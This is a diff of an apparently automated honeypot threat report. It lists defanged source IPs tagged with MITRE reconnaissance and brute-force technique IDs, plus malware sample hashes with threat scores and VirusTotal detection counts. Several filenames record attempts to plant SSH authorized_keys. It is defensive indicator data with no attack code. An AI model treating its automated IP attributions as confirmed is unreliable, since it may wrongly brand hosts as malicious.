+| `137.184.5[.]188` | 1 | 2026-11-19 03:02 | 2026-11-19 03:04 | 120s | 0 | `T1592` | 🟢 LOW |
+| `139.198.29[.]172` | 1 | 2026-11-19 14:40 | 2026-11-19 14:42 | 120s | 0 | `T1592` | 🟢 LOW |
+| `146.158.111[.]113` | 1 | 2026-11-19 14:17 | 2026-11-19 14:17 | 0s | 0 | `T1592` | 🟢 LOW |
+| `147.125.241[.]19` | 1 | 2026-11-19 15:07 | 2026-11-19 15:07 | 0s | 0 | `T1592` | 🟢 LOW |
+| `160.250.240[.]158` | 1 | 2026-11-19 09:15 | 2026-11-19 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
+| `165.227.62[.]247` | 1 | 2026-11-19 08:16 | 2026-11-19 08:16 | 0s | 0 | `T1592` | 🟢 LOW |
+| `165.227.9[.]153` | 1 | 2026-11-19 03:26 | 2026-11-19 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
+| `169.128.70[.]53` | 1 | 2026-11-19 07:09 | 2026-11-19 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
+| `169.128.70[.]53` | 1 | 2026-11-19 09:58 | 2026-11-19 09:58 | 0s | 0 | `T1592` | 🟢 LOW |
+| `169.128.70[.]53` | 1 | 2026-11-19 13:09 | 2026-11-19 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
+| `172.235.41[.]110` | 1 | 2026-11-19 11:37 | 2026-11-19 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
+| `172.235.41[.]203` | 1 | 2026-11-19 13:01 | 2026-11-19 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
+| `173.255.197[.]52` | 1 | 2026-11-19 03:28 | 2026-11-19 03:28 | 1s | 0 | `T1592` | 🟢 LOW |
+| `173.33.182[.]212` | 1 | 2026-11-19 10:27 | 2026-11-19 10:27 | 0s | 0 | `T1592` | 🟢 LOW |
+| `175.203.243[.]177` | 1 | 2026-11-19 03:05 | 2026-11-19 03:05 | 27s | 0 | `T1592` | 🟢 LOW |
+| `176.202.206[.]43` | 1 | 2026-11-19 14:59 | 2026-11-19 14:59 | 0s | 0 | `T1592` | 🟢 LOW |
+| `176.65.148[.]183` | 1 | 2026-11-19 15:37 | 2026-11-19 15:37 | 0s | 0 | `T1592` | 🟢 LOW |
+| `177.128.115[.]217` | 1 | 2026-11-19 05:35 | 2026-11-19 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
+| `180.76.242[.]143` | 1 | 2026-11-19 04:08 | 2026-11-19 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
+| `181.229.171[.]64` | 1 | 2026-11-19 17:58 | 2026-11-19 17:58 | 0s | 0 | `T1592` | 🟢 LOW |
+| `181.46.66[.]111` | 1 | 2026-11-19 18:11 | 2026-11-19 18:11 | 14s | 0 | `T1592` | 🟢 LOW |
+| `182.52.90[.]208` | 1 | 2026-11-19 08:18 | 2026-11-19 08:19 | 72s | 0 | `T1592` | 🟢 LOW |
+| `185.226.197[.]37` | 1 | 2026-11-19 17:53 | 2026-11-19 17:53 | 8s | 0 | `T1592` | 🟢 LOW |
+| `193.107.54[.]90` | 1 | 2026-11-19 13:43 | 2026-11-19 13:43 | 13s | 0 | `T1592` | 🟢 LOW |
+| `193.32.162[.]15` | 1 | 2026-11-19 06:48 | 2026-11-19 06:48 | 0s | 0 | `T1592` | 🟢 LOW |
+| `193.32.162[.]15` | 1 | 2026-11-19 10:37 | 2026-11-19 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
+| `193.32.162[.]15` | 1 | 2026-11-19 14:18 | 2026-11-19 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
+| `195.178.110[.]227` | 1 | 2026-11-19 17:54 | 2026-11-19 17:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `195.178.110[.]78` | 1 | 2026-11-19 18:06 | 2026-11-19 18:06 | 1s | 1 | `T1110.001` | 🟢 LOW |
+| `195.96.138[.]57` | 1 | 2026-11-19 14:21 | 2026-11-19 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
+| `20.64.98[.]23` | 1 | 2026-11-19 12:07 | 2026-11-19 12:07 | 10s | 0 | `T1592` | 🟢 LOW |
+| `200.138.46[.]135` | 1 | 2026-11-19 09:30 | 2026-11-19 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
+| `203.150.171[.]174` | 1 | 2026-11-19 03:46 | 2026-11-19 03:46 | 33s | 0 | `T1592` | 🟢 LOW |
+| `218.158.190[.]6` | 1 | 2026-11-19 06:01 | 2026-11-19 06:01 | 8s | 0 | `T1592` | 🟢 LOW |
+| `221.214.181[.]197` | 1 | 2026-11-19 11:28 | 2026-11-19 11:29 | 28s | 0 | `T1592` | 🟢 LOW |
+| `23.132.164[.]185` | 1 | 2026-11-19 12:39 | 2026-11-19 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
+| `3.129.187[.]38` | 1 | 2026-11-19 05:33 | 2026-11-19 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
+| `3.129.187[.]38` | 1 | 2026-11-19 07:53 | 2026-11-19 07:53 | 9s | 0 | `T1592` | 🟢 LOW |
+| `34.1.227[.]164` | 1 | 2026-11-19 04:45 | 2026-11-19 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
+| `35.214.145[.]207` | 1 | 2026-11-19 05:10 | 2026-11-19 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
+| `35.214.148[.]230` | 1 | 2026-11-19 04:34 | 2026-11-19 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
+| `35.214.204[.]44` | 1 | 2026-11-19 04:45 | 2026-11-19 04:45 | 2s | 0 | `T1592` | 🟢 LOW |
+| `35.214.225[.]27` | 1 | 2026-11-19 05:24 | 2026-11-19 05:24 | 0s | 0 | `T1592` | 🟢 LOW |
+| `35.214.230[.]217` | 1 | 2026-11-19 04:52 | 2026-11-19 04:52 | 0s | 0 | `T1592` | 🟢 LOW |
+| `39.106.20[.]83` | 1 | 2026-11-19 10:33 | 2026-11-19 10:33 | 2s | 0 | `T1592` | 🟢 LOW |
+| `40.67.165[.]94` | 1 | 2026-11-19 15:44 | 2026-11-19 15:44 | 10s | 0 | `T1592` | 🟢 LOW |
+| `41.82.206[.]14` | 1 | 2026-11-19 07:00 | 2026-11-19 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
+| `45.63.4[.]69` | 1 | 2026-11-19 07:38 | 2026-11-19 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
+| `46.151.178[.]14` | 1 | 2026-11-19 14:45 | 2026-11-19 14:45 | 0s | 0 | `T1592` | 🟢 LOW |
+| `47.251.105[.]60` | 1 | 2026-11-19 03:25 | 2026-11-19 03:25 | 0s | 0 | `T1592` | 🟢 LOW |
+| `47.252.6[.]214` | 1 | 2026-11-19 03:25 | 2026-11-19 03:25 | 0s | 0 | `T1592` | 🟢 LOW |
+| `48.217.50[.]172` | 1 | 2026-11-19 12:03 | 2026-11-19 12:03 | 9s | 0 | `T1592` | 🟢 LOW |
+| `54.215.254[.]166` | 1 | 2026-11-19 15:30 | 2026-11-19 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
+| `58.37.101[.]126` | 1 | 2026-11-19 18:46 | 2026-11-19 18:46 | 12s | 0 | `T1592` | 🟢 LOW |
+| `59.28.174[.]77` | 1 | 2026-11-19 11:46 | 2026-11-19 11:46 | 20s | 0 | `T1592` | 🟢 LOW |
+| `61.41.4[.]17` | 1 | 2026-11-19 08:20 | 2026-11-19 08:20 | 5s | 0 | `T1592` | 🟢 LOW |
+| `62.60.130[.]219` | 1 | 2026-11-19 07:03 | 2026-11-19 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
+| `62.60.130[.]219` | 1 | 2026-11-19 16:06 | 2026-11-19 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
+| `64.227.90[.]185` | 1 | 2026-11-19 12:52 | 2026-11-19 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
+| `64.62.197[.]182` | 1 | 2026-11-19 03:45 | 2026-11-19 03:45 | 2s | 0 | `T1592` | 🟢 LOW |
+| `64.62.197[.]48` | 1 | 2026-11-19 02:58 | 2026-11-19 02:58 | 2s | 0 | `T1592` | 🟢 LOW |
+| `64.62.197[.]57` | 1 | 2026-11-19 04:13 | 2026-11-19 04:14 | 4s | 0 | `T1592` | 🟢 LOW |
+| `65.49.1[.]172` | 1 | 2026-11-19 06:47 | 2026-11-19 06:47 | 0s | 0 | `T1592` | 🟢 LOW |
+| `66.132.159[.]143` | 1 | 2026-11-19 09:34 | 2026-11-19 09:34 | 1s | 0 | `T1592` | 🟢 LOW |
+| `66.132.172[.]44` | 1 | 2026-11-19 10:36 | 2026-11-19 10:36 | 3s | 0 | `T1592` | 🟢 LOW |
+| `66.132.186[.]181` | 1 | 2026-11-19 09:34 | 2026-11-19 09:34 | 1s | 0 | `T1592` | 🟢 LOW |
+| `66.228.53[.]157` | 1 | 2026-11-19 16:38 | 2026-11-19 16:38 | 0s | 0 | `T1592` | 🟢 LOW |
+| `68.183.161[.]107` | 1 | 2026-11-19 05:11 | 2026-11-19 05:11 | 1s | 0 | `T1592` | 🟢 LOW |
+| `70.176.108[.]73` | 1 | 2026-11-19 10:06 | 2026-11-19 10:06 | 13s | 0 | `T1592` | 🟢 LOW |
+| `71.135.2[.]221` | 1 | 2026-11-19 13:19 | 2026-11-19 13:19 | 0s | 0 | `T1592` | 🟢 LOW |
+| `73.129.93[.]75` | 1 | 2026-11-19 09:52 | 2026-11-19 09:52 | 0s | 0 | `T1592` | 🟢 LOW |
+| `74.82.47[.]4` | 1 | 2026-11-19 12:03 | 2026-11-19 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]130` | 1 | 2026-11-19 03:03 | 2026-11-19 03:03 | 0s | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]130` | 1 | 2026-11-19 07:40 | 2026-11-19 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]130` | 1 | 2026-11-19 18:04 | 2026-11-19 18:04 | 0s | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]132` | 1 | 2026-11-19 09:46 | 2026-11-19 09:46 | 0s | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]252` | 1 | 2026-11-19 06:25 | 2026-11-19 06:25 | 1s | 1 | `T1110.001` | 🟢 LOW |
+| `77.239.124[.]252` | 1 | 2026-11-19 12:35 | 2026-11-19 12:35 | 1s | 1 | `T1110.001` | 🟢 LOW |
+| `77.239.124[.]252` | 1 | 2026-11-19 18:42 | 2026-11-19 18:42 | 1s | 1 | `T1110.001` | 🟢 LOW |
+| `78.128.112[.]74` | 1 | 2026-11-19 07:13 | 2026-11-19 07:13 | 6s | 0 | `T1592` | 🟢 LOW |
+| `78.128.112[.]74` | 1 | 2026-11-19 11:45 | 2026-11-19 11:45 | 6s | 0 | `T1592` | 🟢 LOW |
+| `78.128.112[.]74` | 1 | 2026-11-19 16:15 | 2026-11-19 16:15 | 6s | 0 | `T1592` | 🟢 LOW |
+| `80.94.92[.]179` | 1 | 2026-11-19 04:22 | 2026-11-19 04:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `85.217.149[.]41` | 1 | 2026-11-19 16:00 | 2026-11-19 16:00 | 0s | 0 | `T1592` | 🟢 LOW |
+| `85.217.149[.]8` | 1 | 2026-11-19 05:41 | 2026-11-19 05:41 | 0s | 0 | `T1592` | 🟢 LOW |
+| `88.178.126[.]237` | 1 | 2026-11-19 12:57 | 2026-11-19 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
+| `92.118.39[.]63` | 1 | 2026-11-19 12:12 | 2026-11-19 12:12 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `97.186.135[.]14` | 1 | 2026-11-19 06:27 | 2026-11-19 06:27 | 13s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
-## 🦠 Malware Analysis Results (871 sample(s))
+## 🦠 Malware Analysis Results (49 sample(s))
 
 | File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
 |---|---|---|---|---|---|
@@ -1175,6 +1332,7 @@ Source IPs: `160.119.66.206`
 | `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
 | `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
 | `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
+| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
 | `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
 | `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
 | `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
@@ -1216,829 +1374,6 @@ Source IPs: `160.119.66.206`
 | `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
 | `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
 | `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
-| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
-| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260829-070814-1e3fd1472a75-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260829-070814-1e3fd1472a75-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260829-070814-1e3fd1472a75-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260829-070814-1e3fd1472a75-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260913-011104-f5ed7ce067ce-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260913-011104-f5ed7ce067ce-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260913-011104-f5ed7ce067ce-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260913-011104-f5ed7ce067ce-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260920-003037-b88cc1613267-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260920-003037-b88cc1613267-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260920-003037-b88cc1613267-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260920-003037-b88cc1613267-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20260927-145506-d03196a77e63-1-redir__home_agent__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
-| `20261008-145415-23c1b0a0025f-1-redir__root__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
-| `20261009-093904-ac680d88c8d9-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261009-095945-4c9839647ec3-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261009-100311-4d516f02cba6-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261019-185426-081336a62cf7-1-redir__home_rita__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
-| `20261019-225429-8362bcca82fc-1-redir__home_frontend__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
-| `20261025-185437_sftp__root__5233262310663267715_sshd` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
-| `20261104-221051-7938b165b97e-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261104-221051-7938b165b97e-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261104-221051-7938b165b97e-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261104-221051-7938b165b97e-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261105-105425_sftp__root__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `20261106-175451-3c25612f55b3-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261106-175451-3c25612f55b3-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261106-175451-3c25612f55b3-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261106-175451-3c25612f55b3-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261107-105429_sftp__root__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `f609b7d911ffd85f...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `20261108-005209_sftp__dev_shm__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `8e9db283c40447a6...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `20261109-005416_sftp__dev_shm__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `fdc54d0e4bf1fa52...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `20261109-040344-27e7ba64863a-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040344-27e7ba64863a-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040345-27e7ba64863a-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040345-27e7ba64863a-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040345-27e7ba64863a-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
-| `20261109-040346-27e7ba64863a-0-redir__home__d` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
